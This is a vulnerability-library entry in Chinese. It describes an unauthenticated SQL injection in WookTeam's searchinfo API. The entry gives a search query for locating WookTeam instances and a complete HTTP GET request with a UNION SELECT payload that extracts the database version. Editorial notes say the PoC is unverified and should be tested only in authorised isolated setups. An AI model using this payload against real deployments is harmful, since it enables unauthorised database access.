---
source: "wy876 漏洞文库"
title: "WookTeam searchinfo where username SQL注入"
product: "WookTeam"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；MySQL、五列查询结构"
prerequisites: "无鉴权请求示例"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ocbt8satalaaymlq"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/WookTeam/WookTeamsearchinfo%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-e161fa36de7bc1e98081d218"
entity_id: "ve-e161fa36de7bc1e98081d218"
schema_version: "1"
---

# WookTeam searchinfo where username SQL注入

## 条目说明

- 对象与具体问题：WookTeam；searchinfo where username SQL注入
- 版本、配置及部署条件：版本未知；MySQL、五列查询结构
- 认证与权限前提：无鉴权请求示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有UNION version请求，无响应、源码和固定版本，当前仅候选PoC
- Host空；需说明where数组如何进入SQL，五列依赖不能泛化

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
WookTeam是一款轻量级的开源在线团队协作工具，提供各类文档协作工具、在线思维导图、在线流程图、项目管理、任务分发、即时IM，知识库管理等工具。WookTeam接口searchinfo存在SQL注入漏洞

## 二、影响版本
+ WookTeam 

## 三、资产测绘
```plain
title="Wookteam"
```


## 四、漏洞复现
```http
GET /api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
Host: 
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ocbt8satalaaymlq>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
